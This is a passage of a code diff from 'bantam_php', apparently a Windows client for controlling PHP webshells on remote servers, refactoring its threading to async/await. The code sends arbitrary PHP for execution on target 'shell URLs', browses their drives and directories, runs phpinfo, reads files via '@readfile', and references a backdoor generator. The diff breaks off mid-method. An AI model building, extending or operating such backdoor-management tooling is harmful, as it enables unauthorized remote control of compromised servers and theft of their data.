@@ -6,6 +6,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Xml;
 
@@ -53,7 +54,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private void BantamMain_Load(object sender, EventArgs e)
         {
-            XmlHelper.loadShells();
+            XmlHelper.loadShells(CONFIG_FILE);
         }
 
         /// <summary>
@@ -109,27 +110,6 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="arg"></param>
-        public delegate void guiCallbackUpdateListViewItemDelegate(object arg = null);
-        public void guiCallbackUpdateListViewItemPing(object arg = null)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(new guiCallbackUpdateListViewItemDelegate(guiCallbackUpdateListViewItemPing), arg);
-                return;
-            }
-
-            object[] objects = (object[])arg;
-            ListViewItem lvi = (ListViewItem)objects[0];
-            string hostTarget = (string)objects[1];
-
-            lvi.SubItems[1].Text = Hosts[hostTarget].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
-            Hosts[hostTarget].PingStopwatch.Stop();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
         /// <param name="shellURL"></param>
         public delegate void guiCallbackRemoveShellURLDeledate(string shellURL);
         public void guiCallbackRemoveShellURL(string shellURL)
@@ -147,325 +127,6 @@ namespace bantam_php
             }
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="arg"></param>
-        public delegate void guiCallbackBrowserViewDelegate(object arg = null);
-        public void guiCallbackBrowserViewMethod(object arg = null)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(new guiCallbackBrowserViewDelegate(guiCallbackBrowserViewMethod), arg);
-                return;
-            }
-
-            if (arg != null)
-            {
-                object[] objects = (object[])arg;
-                string result = (string)objects[1];
-
-                if (string.IsNullOrEmpty(result) == false)
-                {
-                    BrowserView broView = new BrowserView(result, 1000, 1000);
-                    broView.Show();
-                }
-            }
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="arg"></param>
-        public delegate void fileBrowserWindowsStartDelegate(object arg = null);
-        public void fileBrowserWindowsStartMethod(object arg = null)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(new fileBrowserWindowsStartDelegate(fileBrowserWindowsStartMethod), arg);
-                return;
-            }
-
-            if (arg != null)
-            {
-                object[] objects = (object[])arg;
-                string result = (string)objects[1];
-
-                if (string.IsNullOrEmpty(result) == false)
-                {
-                    string[] drives = { null };
-                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);
-
-                    if (drives != null && drives.Length > 0)
-                    {
-                        treeViewFileBrowser.Nodes.Clear();
-                        foreach (string drive in drives)
-                        {
-                            treeViewFileBrowser.Nodes.Add("", drive, 3);
-                        }
-                    }
-                }
-            }
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="arg"></param>
-        public delegate void fileBrowserLinuxStartDelegate(object arg = null);
-        public void fileBrowserLinuxStartMethod(object arg = null)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(new fileBrowserLinuxStartDelegate(fileBrowserLinuxStartMethod), arg);
-                return;
-            }
-
-            if (arg != null)
-            {
-                object[] objects = (object[])arg;
-                string hostTarget = (string)objects[0];
-                string result = (string)objects[1];
-
-                if (string.IsNullOrEmpty(result) == false)
-                {
-                    string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
-
-                    if (rows.Length > 0 && rows != null)
-                    {
-                        foreach (string row in rows)
-                        {
-                            string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
-
-                            if (columns != null && columns.Length - 2 > 0)
-                            {
-                                if (columns[columns.Length - 2] == "dir")
-                                {
-                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == g_SelectedShellUrl)
-                                    {
-                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
-                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                        if (string.IsNullOrEmpty(columns[2]) == false)
-                                        {
-                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                        }
-                                    } else {
-                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
-                                        TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 0);
-                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                        if (string.IsNullOrEmpty(columns[2]) == false)
-                                        {
-                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                        }
-                                    }
-                                } else {
-                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == g_SelectedShellUrl)
-                                    {
-                                        TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
-                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                        if (string.IsNullOrEmpty(columns[2]) == false)
-                                        {
-                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                        }
-                                    } else {
-                                        //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
-                                        TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 6);
-                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                        if (string.IsNullOrEmpty(columns[2]) == false)
-                                        {
-                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="arg"></param>
-        public delegate void fileBrowserBtnGoClickDelegate(object arg = null);
-        public void fileBrowserBtnGoClickMethod(object arg = null)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(new fileBrowserBtnGoClickDelegate(fileBrowserBtnGoClickMethod), arg);
-                return;
-            }
-
-            if (arg != null)
-            {
-                object[] objects = (object[])arg;
-                string hostTarget = (string)objects[0];
-                string fileLocation = (string)objects[1];
-                string result = (string)objects[2];
-
-                if (string.IsNullOrEmpty(hostTarget) == false)
-                {
-                    //Clear preview treeview data
-                    Hosts[hostTarget].Files.Nodes.Clear();
-
-                    //if user didn't switch targets by the time this callback is triggered clear the live treeview
-                    if (g_SelectedShellUrl == hostTarget)
-                    {
-                        treeViewFileBrowser.Nodes.Clear();
-                        treeViewFileBrowser.Refresh();
-                    }
-
-                    //patch
-                    txtBoxFileBrowserPath.Text = fileLocation;
-
-                    //set path
-                    string path = txtBoxFileBrowserPath?.Text;
-                    if (string.IsNullOrEmpty(path))
-                    {
-                        path = ".";
-                    }
-
-                    if (result != null && result.Length > 0)
-                    {
-                        string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
-
-                        if (rows.Length > 0 && rows != null)
-                        {
-                            foreach (string row in rows)
-                            {
-                                string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
-
-                                if (columns != null && columns.Length - 2 > 0)
-                                {
-                                    if (columns[columns.Length - 2] == "dir")
-                                    {
-                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                        if (g_SelectedShellUrl == hostTarget)
-                                        {
-                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
-                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                            if (string.IsNullOrEmpty(columns[2]) == false)
-                                            {
-                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                            }
-                                        } else {
-                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
-                                            TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 0);
-                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                            if (string.IsNullOrEmpty(columns[2]) == false)
-                                            {
-                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                            }
-                                        }
-                                    } else {
-                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                        if (g_SelectedShellUrl == hostTarget)
-                                        {
-                                            TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
-                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                            if (string.IsNullOrEmpty(columns[2]) == false)
-                                            {
-                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                            }
-                                        } else {
-                                            //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
-                                            TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 6);
-                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                            if (string.IsNullOrEmpty(columns[2]) == false)
-                                            {
-                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="arg"></param>
-        public delegate void fileBrowserMouseClickDelegate(object arg = null);
-        public void fileBrowserMouseClickMethod(object arg = null)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(new fileBrowserMouseClickDelegate(fileBrowserMouseClickMethod), arg);
-                return;
-            }
-
-            if (arg != null)
-            {
-                object[] objects = (object[])arg;
-                string hostTarget = (string)objects[0];
-                TreeNode tn = (TreeNode)objects[1];
-                string result = (string)objects[2];
-
-                if (string.IsNullOrEmpty(result) == false)
-                {
-                    string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
-
-                    if (rows.Length > 0 && rows != null)
-                    {
-                        foreach (string row in rows)
-                        {
-                            string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
-
-                            if (columns != null && columns.Length - 2 > 0)
-                            {
-                                if (columns[columns.Length - 2] == "dir")
-                                {
-                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == g_SelectedShellUrl)
-                                    {
-                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
-                                        lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
-
-                                        if (string.IsNullOrEmpty(columns[2]) == false)
-                                        {
-                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                        }
-                                    } else {
-                                        //TODO update their client cache here user changed clients
-                                    }
-                                } else {
-                                    //if the user switched targets we do not update the live filebrowser because it is for a different target
-                                    if (hostTarget == g_SelectedShellUrl)
-                                    {
-                                        TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
-                                        if (string.IsNullOrEmpty(columns[2]) == false)
-                                        {
-                                            lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
-                                        }
-                                    } else {
-                                        //TODO update their client cache here user changed clients
-                                    }
-                                }
-                            } else {
-                                //MessageBox.Show(columns[0]);
-                            }
-                        }
-                        tn.Expand();
-                    }
-                }
-            }
-        }
-
         #endregion
 
         #region THREAD_ROUTINES
@@ -476,16 +137,15 @@ namespace bantam_php
         /// <param name="Code"></param>
         /// <param name="Callback"></param>
         /// <param name="CallbackArgs"></param>
-        private void startPhpExecutionThread(string phpCode, Action<object> callback = null, object[] callbackArgs = null)
+        private async Task<string> startPhpExecutionThread(string phpCode)
         {
             if (validTarget() == false)
             {
-                return;
+                return "";
             }
 
-            string hostTarget = g_SelectedShellUrl;
-            Thread t = new Thread(dynamicRequestThread);
-            t.Start(new DynamicThreadArgs(hostTarget, phpCode, callback, callbackArgs));
+            string result = await Task.Run(() => WebHelper.Request2(g_SelectedShellUrl, phpCode));
+            return result;
         }
 
         /// <summary>
@@ -493,31 +153,16 @@ namespace bantam_php
         /// </summary>
         /// <param name="phpCode"></param>
         /// <param name="title"></param>
-        public void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
+        public async void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
         {
-            if (validTarget() == false)
+            string result = await Task.Run(() => WebHelper.Request2(g_SelectedShellUrl, phpCode));
+
+            if (string.IsNullOrEmpty(result) == false)
             {
-                return;
+                CustomForms.RichTextBoxDialog(title, result);
             }
-
-            string hostTarget = g_SelectedShellUrl;
-            var t = new Thread(() => richTextboxDialogThread(hostTarget, phpCode, title));
-            t.Start();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="hostTarget"></param>
-        /// <param name="phpCode"></param>
-        /// <param name="title"></param>
-        public void richTextboxDialogThread(string hostTarget, string phpCode, string title)
-        {
-            string resultTxt = WebHelper.executePHP(hostTarget, phpCode);
-            if (string.IsNullOrEmpty(resultTxt) == false)
+            else
             {
-                CustomForms.RichTextBoxDialog(title, resultTxt);
-            } else {
                 //TODO if (cfg messageboxes)
                 MessageBox.Show("No Data Returned", "Welp...");
             }
@@ -527,7 +172,7 @@ namespace bantam_php
         /// 
         /// </summary>
         /// <param name="hostTarget"></param>
-        public void getInitDataThread(string hostTarget)
+        public async void getInitDataThread(string hostTarget)
         {
             if (string.IsNullOrEmpty(hostTarget.ToString()) == false)
             {
@@ -535,7 +180,7 @@ namespace bantam_php
                 Stopwatch pingWatch = new Stopwatch();
                 pingWatch.Start();
 
-                string result = WebHelper.executePHP(hostTarget, PhpHelper.initDataVars);
+                string result = await WebHelper.Request2(hostTarget, PhpHelper.initDataVars);
 
                 if (string.IsNullOrEmpty(result) == false)
                 {
@@ -561,39 +206,6 @@ namespace bantam_php
             }
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="args"></param>
-        public void dynamicRequestThread(object args)
-        {
-            if (args != null)
-            {
-                //cast the args to our defined class
-                DynamicThreadArgs wrapperArgs = (DynamicThreadArgs)args;
-
-                //execute our request in our threads that runs asynchronously along side the GUI thread
-                string result = WebHelper.executePHP(wrapperArgs.host, wrapperArgs.code);
-
-                if (string.IsNullOrEmpty(result) == false)
-                {
-                    if (wrapperArgs.callbackArgs != null && wrapperArgs.callbackArgs.Length > 0)
-                    {
-                        //TODO: make the following 3 lines suck less or not exist
-                        //appends the result of the php execution into the callback args for the callback function
-                        object[] tmpCallbackArgs = wrapperArgs.callbackArgs;
-                        Array.Resize(ref tmpCallbackArgs, wrapperArgs.callbackArgs.Length + 1);
-                        tmpCallbackArgs[wrapperArgs.callbackArgs.Length] = result;
-
-                        //Invoke the dynamic thread safe callback, with it's "object" of arguments
-                        wrapperArgs.callback?.Invoke(tmpCallbackArgs);
-                    } else {
-                        wrapperArgs.callback?.Invoke(null);
-                    }
-                }
-            }
-        }
-
         #endregion
 
         #region GUI_EVENTS
@@ -603,7 +215,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void evalToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void evalToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
@@ -620,7 +232,7 @@ namespace bantam_php
                     //execute the code and show it in a richtextbox
                     executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedShellUrl);
                 } else {
-                    startPhpExecutionThread(code);
+                    string result = await startPhpExecutionThread(code);
                 }
             }
         }
@@ -630,7 +242,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void pingToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void pingToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
@@ -647,8 +259,11 @@ namespace bantam_php
                 Hosts[g_SelectedShellUrl].PingStopwatch = new Stopwatch();
                 Hosts[g_SelectedShellUrl].PingStopwatch.Start();
 
-                object[] callbackArgs = { lvi, g_SelectedShellUrl };
-                startPhpExecutionThread(PhpHelper.phpTestExecutionWithEcho, guiCallbackUpdateListViewItemPing, callbackArgs);
+                string result = await startPhpExecutionThread(PhpHelper.phpTestExecutionWithEcho);
+
+                lvi.SubItems[1].Text = Hosts[g_SelectedShellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
+                Hosts[g_SelectedShellUrl].PingStopwatch.Stop();
+
             }
         }
 
@@ -657,14 +272,20 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            startPhpExecutionThread(PhpHelper.phpInfo, guiCallbackBrowserViewMethod);
+            string result = await startPhpExecutionThread(PhpHelper.phpInfo);
+
+            if (string.IsNullOrEmpty(result) == false)
+            {
+                BrowserView broView = new BrowserView(result, 1000, 1000);
+                broView.Show();
+            }
         }
 
         /// <summary>
@@ -750,12 +371,12 @@ namespace bantam_php
                     lblDynHDDSpace.Text = string.IsNullOrEmpty(Hosts[g_SelectedShellUrl].TotalHDDSpace) ? "0"
                                         : GuiHelper.FormatBytes(Convert.ToDouble(Hosts[g_SelectedShellUrl].TotalHDDSpace));
 
-                    lblDynServerIP.Text = Hosts[g_SelectedShellUrl].IP;
-                    lblDynUname.Text = Hosts[g_SelectedShellUrl].UnameRelease + " " + Hosts[g_SelectedShellUrl].UnameKernel;
-                    lblDynUser.Text = Hosts[g_SelectedShellUrl].UID + " ( " + Hosts[g_SelectedShellUrl].User + " )";
-                    lblDynWebServer.Text = Hosts[g_SelectedShellUrl].ServerSoftware;
-                    lblDynGroup.Text = Hosts[g_SelectedShellUrl].GID + " ( " + Hosts[g_SelectedShellUrl].Group + " )";
-                    lblDynPHP.Text = Hosts[g_SelectedShellUrl].PHP_Version;
+                    lblDynServerIP.Text     = Hosts[g_SelectedShellUrl].IP;
+                    lblDynUname.Text        = Hosts[g_SelectedShellUrl].UnameRelease + " " + Hosts[g_SelectedShellUrl].UnameKernel;
+                    lblDynUser.Text         = Hosts[g_SelectedShellUrl].UID + " ( " + Hosts[g_SelectedShellUrl].User + " )";
+                    lblDynWebServer.Text    = Hosts[g_SelectedShellUrl].ServerSoftware;
+                    lblDynGroup.Text        = Hosts[g_SelectedShellUrl].GID + " ( " + Hosts[g_SelectedShellUrl].Group + " )";
+                    lblDynPHP.Text          = Hosts[g_SelectedShellUrl].PHP_Version;
                 }
 
                 if (tabControl1.SelectedTab == tabPageFiles)
@@ -818,7 +439,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            XmlHelper.saveShells();
+            XmlHelper.saveShells(CONFIG_FILE);
         }
 
         private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
@@ -871,7 +492,7 @@ namespace bantam_php
             }
         }
 
-        private void pingToolStripMenuItem1_Click(object sender, EventArgs e)
+        private async void pingToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             //Done this way because it possibly may be "down" and need retesting
             if (string.IsNullOrEmpty(g_SelectedShellUrl)
@@ -891,8 +512,7 @@ namespace bantam_php
             Hosts[shellURL].RequestArgName = requestArgName;
             Hosts[shellURL].SendDataViaCookie = sendViaCookie;
 
-            Thread t = new Thread(() => Program.g_BantamMain.getInitDataThread(shellURL));
-            t.Start();
+            Program.g_BantamMain.getInitDataThread(shellURL);
         }
 
         private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
@@ -930,7 +550,7 @@ namespace bantam_php
             }
         }
 
-        private void openToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void openToolStripMenuItem_Click(object sender, EventArgs e)
         {
             OpenFileDialog openShellXMLDialog = new OpenFileDialog();
             openShellXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
@@ -973,7 +593,7 @@ namespace bantam_php
             filebrowserGoBack();
         }
 
-        private void btnFileBrowserGo_Click(object sender, EventArgs e)
+        private async void btnFileBrowserGo_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
@@ -985,32 +605,148 @@ namespace bantam_php
                 return;
             }
 
+            string hostTarget = g_SelectedShellUrl;
             string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Hosts[g_SelectedShellUrl].PHP_Version);
 
-            //todo fix the need of selected target being passed??...
-            object[] callbackParams = { g_SelectedShellUrl, txtBoxFileBrowserPath.Text }; //todo this was added temp as a fix for crappy rigging of dynamic thread args class. needs rework to not force result to be last, so we know the known locations and thus furthering its dynamicness
-            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod, callbackParams);
+            string result = await startPhpExecutionThread(directoryContentsPHPCode);
+
+            if (string.IsNullOrEmpty(hostTarget) == false)
+            {
+                //Clear preview treeview data
+                Hosts[hostTarget].Files.Nodes.Clear();
+
+                //if user didn't switch targets by the time this callback is triggered clear the live treeview
+                if (g_SelectedShellUrl == hostTarget)
+                {
+                    treeViewFileBrowser.Nodes.Clear();
+                    treeViewFileBrowser.Refresh();
+                }
+
+                //patch
+                txtBoxFileBrowserPath.Text = result;
+
+                //set path
+                string path = txtBoxFileBrowserPath?.Text;
+                if (string.IsNullOrEmpty(path))
+                {
+                    path = ".";
+                }
+
+                if (result != null && result.Length > 0)
+                {
+                    FileBrowserGo(result, hostTarget);
+                }
+            }
+        }
+
+        private void FileBrowserGo(string result, string hostTarget)
+        {
+            string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
+
+            if (rows.Length > 0 && rows != null)
+            {
+                foreach (string row in rows)
+                {
+                    string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
+
+                    if (columns != null && columns.Length - 2 > 0)
+                    {
+                        if (columns[columns.Length - 2] == "dir")
+                        {
+                            //if the user switched targets we do not update the live filebrowser because it is for a different target
+                            if (g_SelectedShellUrl == hostTarget)
+                            {
+                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
+                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
+
+                                if (string.IsNullOrEmpty(columns[2]) == false)
+                                {
+                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                }
+                            }
+                            else
+                            {
+                                //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
+                                TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 0);
+                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
+
+                                if (string.IsNullOrEmpty(columns[2]) == false)
+                                {
+                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                }
+                            }
+                        }
+                        else
+                        {
+                            //if the user switched targets we do not update the live filebrowser because it is for a different target
+                            if (g_SelectedShellUrl == hostTarget)
+                            {
+                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
+                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
+
+                                if (string.IsNullOrEmpty(columns[2]) == false)
+                                {
+                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                }
+                            }
+                            else
+                            {
+                                //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
+                                TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 6);
+                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
+
+                                if (string.IsNullOrEmpty(columns[2]) == false)
+                                {
+                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                }
+                            }
+                        }
+                    }
+                }
+            }
         }
 
         /// <summary>
         /// 
         /// </summary>
-        private void start_FileBrowser()
+        private async void start_FileBrowser()
         {
             if (validTarget() == false)
             {
                 return;
             }
 
+            string hostTarget = g_SelectedShellUrl;
             txtBoxFileBrowserPath.Text = Hosts[g_SelectedShellUrl].CWD;
 
             if (Hosts[g_SelectedShellUrl].isWindows)
             {
                 txtBoxFileBrowserPath.Text = "";
-                startPhpExecutionThread(PhpHelper.getHardDriveLetters, fileBrowserWindowsStartMethod);
+
+                string result = await startPhpExecutionThread(PhpHelper.getHardDriveLetters);
+
+                if (string.IsNullOrEmpty(result) == false)
+                {
+                    string[] drives = { null };
+                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);
+
+                    if (drives != null && drives.Length > 0)
+                    {
+                        treeViewFileBrowser.Nodes.Clear();
+                        foreach (string drive in drives)
+                        {
+                            treeViewFileBrowser.Nodes.Add("", drive, 3);
+                        }
+                    }
+                }
             } else {
                 string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(".", Hosts[g_SelectedShellUrl].PHP_Version);
-                startPhpExecutionThread(directoryContentsPHPCode, fileBrowserLinuxStartMethod);
+                string result = await startPhpExecutionThread(directoryContentsPHPCode);
+
+                if (result != null && result.Length > 0)
+                {
+                    FileBrowserGo(result, hostTarget);
+                }
             }
 
             if (tabControl1.SelectedTab != tabPageFiles)
@@ -1032,13 +768,14 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        private void filebrowserGoBack()
+        private async void filebrowserGoBack()
         {
             if (validTarget() == false)
             {
                 return;
             }
 
+            string hostTarget = g_SelectedShellUrl;
             string[] paths = txtBoxFileBrowserPath.Text.Split('/');
             string lastPathRemoved = string.Join("/", paths, 0, paths.Count() - 1);
 
@@ -1050,20 +787,50 @@ namespace bantam_php
             string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(lastPathRemoved, Hosts[g_SelectedShellUrl].PHP_Version);
             object[] callbackParams = { g_SelectedShellUrl, lastPathRemoved };
 
-            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod, callbackParams);
+            string result = await startPhpExecutionThread(directoryContentsPHPCode);
+
+            if (string.IsNullOrEmpty(hostTarget) == false)
+            {
+                //Clear preview treeview data
+                Hosts[hostTarget].Files.Nodes.Clear();
+
+                //if user didn't switch targets by the time this callback is triggered clear the live treeview
+                if (g_SelectedShellUrl == hostTarget)
+                {
+                    treeViewFileBrowser.Nodes.Clear();
+                    treeViewFileBrowser.Refresh();
+                }
+
+                //patch
+                txtBoxFileBrowserPath.Text = result;
+
+                //set path
+                string path = txtBoxFileBrowserPath?.Text;
+                if (string.IsNullOrEmpty(path))
+                {
+                    path = ".";
+                }
+
+                if (result != null && result.Length > 0)
+                {
+                    FileBrowserGo(result, hostTarget);
+                }
+            }
         }
+
         /// <summary>
         /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
+        private async void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
+            string hostTarget = g_SelectedShellUrl;
             TreeNode tn = treeViewFileBrowser.SelectedNode;
 
             if (tn != null && tn.Nodes.Count == 0)
@@ -1085,18 +852,66 @@ namespace bantam_php
                    
                     //Get Directory Contents PHP code
                     string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, Hosts[g_SelectedShellUrl].PHP_Version);
+                    string result = await startPhpExecutionThread(directoryContentsPHPCode);
 
-                    //attempts to execute the directoryContents PHP code on the "target"
-                    //setup GUI callback to call after request
-                    //setup main thread
+                    if (string.IsNullOrEmpty(result) == false)
+                    {
+                        string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
 
-                    object[] callbackParams = { g_SelectedShellUrl, tn };
-                    startPhpExecutionThread(directoryContentsPHPCode, fileBrowserMouseClickMethod, callbackParams);
+                        if (rows.Length > 0 && rows != null)
+                        {
+                            foreach (string row in rows)
+                            {
+                                string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
+
+                                if (columns != null && columns.Length - 2 > 0)
+                                {
+                                    if (columns[columns.Length - 2] == "dir")
+                                    {
+                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
+                                        if (hostTarget == g_SelectedShellUrl)
+                                        {
+                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
+                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
+
+                                            if (string.IsNullOrEmpty(columns[2]) == false)
+                                            {
+                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                            }
+                                        }
+                                        else
+                                        {
+                                            //TODO update their client cache here user changed clients
+                                        }
+                                    }
+                                    else
+                                    {
+                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
+                                        if (hostTarget == g_SelectedShellUrl)
+                                        {
+                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
+                                            if (string.IsNullOrEmpty(columns[2]) == false)
+                                            {
+                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                            }
+                                        }
+                                        else
+                                        {
+                                            //TODO update their client cache here user changed clients
+                                        }
+                                    }
+                                }
+                                else
+                                {
+                                    //MessageBox.Show(columns[0]);
+                                }
+                            }
+                            tn.Expand();
+                        }
+                    }
                 }
             }
         }
-
-        //TODO Cleanup later, find another way to do this or disable the flashing
 
         /// <summary>
         /// Override Prevents the filebrowser icon from being changed when selected
@@ -1158,8 +973,8 @@ namespace bantam_php
         /// <param name="e"></param>
         private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
         {
-            string name = fileBrowserGetFileName();
-            string phpCode = "@readfile('" + name + "');";
